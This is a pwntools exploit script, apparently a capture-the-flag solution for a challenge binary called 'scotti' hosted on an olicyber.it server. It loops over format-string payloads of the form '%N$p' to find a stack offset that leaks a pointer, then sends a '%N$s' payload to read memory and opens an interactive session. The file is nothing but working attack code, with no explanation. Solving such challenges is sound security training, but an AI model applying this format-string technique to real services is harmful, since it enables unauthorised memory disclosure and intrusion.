from pwn import *

exe = ELF("scotti", checksec=True)

context.binary = exe

HOST = "scotti.challs.olicyber.it"
PORT = 12202

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def main():
    idx = 0
    
    for i in range(1, 100):
        r = conn()

        r.recvuntil(b"risposta? ")
        r.sendline(b".. " + str(f"%{i}$p").encode() + b" ..")
        r.recvuntil(b"..")
        data = r.recvuntil(b"..")
        if b"0x7" in data:
            idx = i + 1
            break
        r.close()

    r = conn()
    r.recvuntil(b"risposta? ")
    r.sendline(f"%{idx}$s!".encode())

    r.interactive()
    
if __name__ == "__main__":
    main()
